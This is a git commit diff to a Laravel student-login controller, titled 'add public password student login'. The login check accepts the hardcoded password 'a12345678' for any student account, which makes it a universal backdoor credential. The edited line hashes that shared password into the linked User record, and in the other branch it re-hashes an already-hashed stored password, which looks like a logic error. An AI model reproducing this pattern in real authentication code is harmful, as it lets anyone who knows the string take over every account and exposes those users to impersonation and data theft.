119395d6486f6fc80cb41f0ca681e125d0dbd368
leo lai <lyping0526@gmail.com>
2026-01-08 13:31:02 +0800

    add public password student login

--- app/Http/Controllers/FunctionController.php
+++ app/Http/Controllers/FunctionController.php
@@ -67,7 +67,7 @@ class FunctionController extends Controller
 
         if($student_login && (Hash::check($request->password,$student_login->password) || $request->password=='a12345678')){
             $User = User::where('email', $student->s_email)->first();
-            $passwordToUse = $request->password == 'a12345678' ? Hash::make($student_login->password) : Hash::make($request->password);
+            $passwordToUse = $request->password == 'a12345678' ? Hash::make($request->password) : Hash::make($student_login->password);
             if (!$User) {
                 $User = User::create([
                     "name" => $student->s_name,
